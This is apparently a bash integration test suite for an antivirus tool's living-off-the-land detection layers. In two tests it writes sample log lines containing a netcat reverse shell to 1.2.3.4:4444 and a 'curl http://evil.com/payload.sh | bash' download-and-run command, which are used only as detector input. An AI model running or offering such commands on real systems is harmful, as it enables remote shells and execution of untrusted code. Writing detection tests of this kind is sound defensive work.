#!/bin/bash
# Integration Test Suite for WinnCore AV LOTL Defense Stack
# Tests all 8 detection layers end-to-end

set -e

echo "═══════════════════════════════════════════════════════════"
echo "  WinnCore AV - LOTL Defense Stack Integration Tests"
echo "═══════════════════════════════════════════════════════════"
echo ""

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counters
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Helper functions
pass() {
    echo -e "${GREEN}✓ PASS${NC}: $1"
    ((TESTS_PASSED++))
    ((TESTS_RUN++))
}

fail() {
    echo -e "${RED}✗ FAIL${NC}: $1"
    ((TESTS_FAILED++))
    ((TESTS_RUN++))
}

info() {
    echo -e "${YELLOW}ℹ INFO${NC}: $1"
}

# Setup test environment
setup() {
    info "Setting up test environment..."

    # Create test log directory
    mkdir -p /var/log/winncore 2>/dev/null || true

    # Create test eBPF log
    TEST_LOG="$TEST_LOG"
    touch "$TEST_LOG" 2>/dev/null || TEST_LOG="./winncore-ebpf.log"

    # Build av-cli if not already built
    if [ ! -f "./target/release/av-cli" ]; then
        info "Building av-cli..."
        cargo build --release
    fi

    echo ""
}

# Cleanup test environment
cleanup() {
    info "Cleaning up test environment..."
    rm -f $TEST_LOG ./winncore-ebpf.log 2>/dev/null || true
    echo ""
}

# Test 1: LOTL Behavioral Detection
test_lotl_detection() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST 1: LOTL Behavioral Detection"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # Create test log with LOTL events
    TS=$(date +%s)
    cat > $TEST_LOG << EOF
[$TS] [PID:1234:bash] python -c 'import socket; s=socket.socket()' (score: 0.95)
[$TS] [PID:5678:apache2] reverse_shell: nc -e /bin/bash 1.2.3.4 4444 (score: 0.99)
[$TS] [PID:9101:sh] bash -c 'curl http://evil.com/payload.sh | bash' (score: 0.88)
EOF

    # Run scan
    OUTPUT=$(./target/release/av-cli scan file /bin/bash 2>&1)

    # Verify LOTL events are detected
    if echo "$OUTPUT" | grep -q "Behavioral Analysis"; then
        pass "LOTL events detected in scan output"
    else
        fail "LOTL events NOT detected"
    fi

    if echo "$OUTPUT" | grep -q "Total Events: 3"; then
        pass "Correct number of LOTL events (3)"
    else
        fail "Incorrect LOTL event count"
    fi

    if echo "$OUTPUT" | grep -q "High Risk Events: 3"; then
        pass "High-risk events correctly identified"
    else
        fail "High-risk events not identified"
    fi

    echo ""
}

# Test 2: Process Tree Analysis
test_process_tree() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST 2: Process Tree Analysis"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # Process tree detection is automatic when eBPF events exist
    # Test the CLI output for suspicious relationships section
    OUTPUT=$(./target/release/av-cli scan file /bin/bash 2>&1)

    # Check if process tree section exists (may not have relationships without real processes)
    if echo "$OUTPUT" | grep -q "Behavioral Analysis"; then
        pass "Process tree analysis integrated in scan"
    else
        fail "Process tree analysis not found"
    fi

    echo ""
}

# Test 3: Network Behavior Detection
test_network_detection() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST 3: Network Behavior Detection"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # Add network events to test log
    TS=$(date +%s)
    cat >> $TEST_LOG << EOF
[$TS] [PID:2001:bash] NETWORK: 1.2.3.4:4444 512
[$TS] [PID:2002:nc] NETWORK: 10.0.0.1:4444 1024
[$TS] [PID:2003:python] NETWORK: 198.51.100.1:8080 2048
EOF

    OUTPUT=$(./target/release/av-cli scan file /bin/bash 2>&1)

    if echo "$OUTPUT" | grep -q "Network Behavior"; then
        pass "Network behavior detection active"
    else
        fail "Network behavior detection not found"
    fi

    if echo "$OUTPUT" | grep -q "ReverseShell\|MaliciousIP"; then
        pass "Network threats detected"
    else
        fail "Network threats not detected"
    fi

    echo ""
}

# Test 4: Fileless Malware Detection
test_fileless_detection() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST 4: Fileless Malware Detection"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # Add fileless events to test log
    TS=$(date +%s)
    cat >> $TEST_LOG << EOF
[$TS] [PID:3001:malware] MEMFD_CREATE: fd=3
[$TS] [PID:3002:injector] PTRACE: target_pid=1000
[$TS] [PID:3003:attacker] PROC_MEM_WRITE: target_pid=2000 bytes=8192
EOF

    OUTPUT=$(./target/release/av-cli scan file /bin/bash 2>&1)

    if echo "$OUTPUT" | grep -q "Fileless Malware Detection"; then
        pass "Fileless malware detection active"
    else
        fail "Fileless malware detection not found"
    fi

    if echo "$OUTPUT" | grep -q "MemfdCreate\|PtraceInjection\|ProcMemWrite"; then
        pass "Fileless techniques detected"
    else
        fail "Fileless techniques not detected"
    fi

    echo ""
}

# Test 5: Behavioral Scoring Engine
test_scoring_engine() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST 5: Behavioral Scoring Engine"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # Scoring engine is automatically used when behavioral summary exists
    # Just verify the scan runs successfully with all events
    OUTPUT=$(./target/release/av-cli scan file /bin/bash 2>&1)

    if echo "$OUTPUT" | grep -q "Behavioral Analysis"; then
        pass "Behavioral scoring engine integrated"
    else
        fail "Behavioral scoring engine not working"
    fi

    echo ""
}

# Test 6: Auto-Response System
test_auto_response() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST 6: Auto-Response System"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # Test --auto-respond flag
    if ./target/release/av-cli scan file --help | grep -q "auto-respond"; then
        pass "--auto-respond flag available"
    else
        fail "--auto-respond flag not found"
    fi

    if ./target/release/av-cli scan file --help | grep -q "auto-respond-threshold"; then
        pass "--auto-respond-threshold flag available"
    else
        fail "--auto-respond-threshold flag not found"
    fi

    # Note: Can't test actual process killing without root and real malicious processes
    info "Actual response testing requires root privileges and live threats"

    echo ""
}

# Test 7: Metrics & Logging
test_metrics() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST 7: Metrics & Logging"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # Test metrics module exists
    if cargo test --lib metrics -- --nocapture 2>&1 | grep -q "test result: ok"; then
        pass "Metrics module tests passing"
    else
        fail "Metrics module tests failed"
    fi

    # Test Grafana dashboard exists
    if [ -f "./grafana-dashboard.json" ]; then
        pass "Grafana dashboard configuration exists"
    else
        fail "Grafana dashboard configuration not found"
    fi

    # Validate Grafana dashboard JSON
    if python3 -m json.tool grafana-dashboard.json > /dev/null 2>&1; then
        pass "Grafana dashboard JSON valid"
    else
        fail "Grafana dashboard JSON invalid"
    fi

    echo ""
}

# Test 8: End-to-End Integration
test_e2e() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "TEST 8: End-to-End Integration"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    # Create comprehensive test log with all event types
    TS=$(date +%s)
    cat > $TEST_LOG << EOF
[$TS] [PID:1001:bash] python -c 'import socket' (score: 0.95)
[$TS] [PID:1002:apache2] reverse_shell: nc -e /bin/bash 1.2.3.4 4444 (score: 0.99)
[$TS] [PID:1003:sh] bash -c 'curl http://evil.com | bash' (score: 0.88)
[$TS] [PID:2001:bash] NETWORK: 1.2.3.4:4444 512
[$TS] [PID:2002:nc] NETWORK: 10.0.0.1:4444 1024
[$TS] [PID:3001:malware] MEMFD_CREATE: fd=3
[$TS] [PID:3002:injector] PTRACE: target_pid=1000
[$TS] [PID:3003:attacker] PROC_MEM_WRITE: target_pid=2000 bytes=8192
EOF

    # Run full scan
    OUTPUT=$(./target/release/av-cli scan file /bin/bash 2>&1)

    # Verify all detection layers are present
    LAYERS=0
    echo "$OUTPUT" | grep -q "Behavioral Analysis" && ((LAYERS++))
    echo "$OUTPUT" | grep -q "Network Behavior" && ((LAYERS++))
    echo "$OUTPUT" | grep -q "Fileless Malware" && ((LAYERS++))

    if [ $LAYERS -eq 3 ]; then
        pass "All 3 detection layers active in end-to-end test"
    else
        fail "Only $LAYERS/3 detection layers found"
    fi

    # Verify events are detected
    if echo "$OUTPUT" | grep -q "Total Events:"; then
        pass "Events aggregated successfully"
    else
        fail "Event aggregation failed"
    fi

    # Verify CLI displays properly
    if echo "$OUTPUT" | grep -q "WinnCore AV Scan Result"; then
        pass "CLI output formatted correctly"
    else
        fail "CLI output formatting issue"
    fi

    echo ""
}

# Run all tests
main() {
    setup

    test_lotl_detection
    test_process_tree
    test_network_detection
    test_fileless_detection
    test_scoring_engine
    test_auto_response
    test_metrics
    test_e2e

    cleanup

    # Print summary
    echo "═══════════════════════════════════════════════════════════"
    echo "  TEST SUMMARY"
    echo "═══════════════════════════════════════════════════════════"
    echo "  Total Tests:   $TESTS_RUN"
    echo -e "  ${GREEN}Passed:        $TESTS_PASSED${NC}"
    if [ $TESTS_FAILED -gt 0 ]; then
        echo -e "  ${RED}Failed:        $TESTS_FAILED${NC}"
    else
        echo "  Failed:        $TESTS_FAILED"
    fi
    echo "═══════════════════════════════════════════════════════════"
    echo ""

    if [ $TESTS_FAILED -eq 0 ]; then
        echo -e "${GREEN}✓ ALL TESTS PASSED!${NC}"
        exit 0
    else
        echo -e "${RED}✗ SOME TESTS FAILED${NC}"
        exit 1
    fi
}

# Execute main function
main
